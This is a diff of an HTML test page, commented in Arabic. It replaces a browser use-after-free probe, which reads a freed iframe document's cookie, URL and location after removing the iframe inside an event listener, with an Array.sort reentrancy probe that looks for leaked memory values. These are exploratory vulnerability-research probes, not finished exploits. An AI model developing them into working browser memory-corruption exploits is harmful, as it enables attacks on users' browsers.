@@ -1,75 +1,54 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button onclick="main()">اختبار: Document Reclaim Leak</button>
+<button onclick="test()">اختبار: Sort Reentrancy</button>
 <pre id="log"></pre>
 <script>
 function log(m) { document.getElementById('log').textContent += m + '\n'; }
 
-function main() {
-    log('=== Document Reclaim Leak Test ===');
+function test() {
+    log('=== Array.sort Reentrancy Test ===');
 
-    const f = document.body.appendChild(document.createElement('iframe'));
-    const a = document.createElement('div');
-    const b = a.appendChild(document.createElement('div'));
+    // أنشئ مصفوفة كبيرة
+    var arr = [];
+    for (var i = 0; i < 1000; i++) arr.push(i);
 
-    // Listener 1: حرر الـ Document
-    a.addEventListener('a', function() {
-        log('[1] تحرير Document...');
-        document.adoptNode(a);
-        f.remove();
-        // لا نرمي spray — نترك الذاكرة كما هي
-    });
+    var callCount = 0;
+    var leaked = [];
 
-    // Listener 2: buffer
-    a.addEventListener('a', () => {});
+    arr.sort(function(a, b) {
+        callCount++;
+        if (callCount === 500) {
+            // في منتصف الـ sort: عدّل المصفوفة
+            log('[*] تعديل المصفوفة أثناء sort (call #' + callCount + ')');
 
-    // Listener 3: اقرأ الخصائص قبل أن يُصفّر المرجع
-    b.addEventListener('a', () => {
-        log('[3] محاولة قراءة Document...');
-        try {
-            var doc = f.contentDocument;
-            if (!doc) {
-                log('[3] f.contentDocument = null');
-                return;
-            }
-            log('[3] f.contentDocument موجود! قراءة الخصائص...');
+            // احذف نصف العناصر
+            arr.length = 500;
+            log('[*] arr.length = ' + arr.length);
 
-            // خصائص آمنة (لا تتبع مؤشرات)
-            try { log('  nodeType: ' + doc.nodeType); } catch(e) { log('  nodeType ERR: ' + e); }
-            try { log('  readyState: ' + doc.readyState); } catch(e) { log('  readyState ERR: ' + e); }
-            try { log('  visibilityState: ' + doc.visibilityState); } catch(e) { log('  visibilityState ERR: ' + e); }
-            try { log('  compatMode: ' + doc.compatMode); } catch(e) { log('  compatMode ERR: ' + e); }
-
-            // خصائص خطر (تتبع مؤشرات)
-            try { log('  URL: ' + doc.URL); } catch(e) { log('  URL ERR: ' + e); }
-            try { log('  referrer: ' + doc.referrer); } catch(e) { log('  referrer ERR: ' + e); }
-            try { log('  title: ' + doc.title); } catch(e) { log('  title ERR: ' + e); }
-            try { log('  cookie: ' + doc.cookie); } catch(e) { log('  cookie ERR: ' + e); }
-            try { log('  domain: ' + doc.domain); } catch(e) { log('  domain ERR: ' + e); }
-            try { log('  characterSet: ' + doc.characterSet); } catch(e) { log('  characterSet ERR: ' + e); }
-            try { log('  contentType: ' + doc.contentType); } catch(e) { log('  contentType ERR: ' + e); }
-
-            // خصائص كائن (تتبع مؤشرات)
-            try {
-                var loc = doc.location;
-                if (loc) log('  location.href: ' + loc.href);
-                else log('  location: null');
-            } catch(e) { log('  location ERR: ' + e); }
-
-            try {
-                var elem = doc.documentElement;
-                if (elem) log('  documentElement: ' + elem.tagName);
-                else log('  documentElement: null');
-            } catch(e) { log('  documentElement ERR: ' + e); }
-
-        } catch(e) {
-            log('[3] CRASH أو خطأ: ' + e);
+            // أضف عناصر جديدة
+            for (var i = 0; i < 500; i++) arr.push(Math.random());
+            log('[*] arr.length بعد الإضافة = ' + arr.length);
         }
+
+        if (callCount === 501 || callCount === 502) {
+            // سجلّ القيم بعد التعديل — هل نقرأ ذاكرة محررة؟
+            leaked.push({ call: callCount, a: a, b: b });
+            log('[!] call=' + callCount + ' a=' + a + ' b=' + b);
+        }
+
+        return a - b;
     });
 
-    log('إرسال الحدث...');
-    b.dispatchEvent(new Event('a', { bubbles: true }));
+    log('[*] إجمالي الاستدعاءات: ' + callCount);
+    log('[*] القيم المسربة بعد التعديل:');
+    leaked.forEach(function(l) {
+        log('  call=' + l.call + ' a=' + l.a + ' b=' + l.b);
+        // لو a أو b = NaN أو رقم ضخم أو سالب → 可能 مسرب ذاكرة
+        if (isNaN(l.a) || isNaN(l.b)) log('  *** NaN DETECTED — possible leak! ***');
+        if (Math.abs(l.a) > 1e15 || Math.abs(l.b) > 1e15) log('  *** LARGE VALUE — possible pointer! ***');
+    });
+
     log('=== انتهى ===');
 }
 </script>
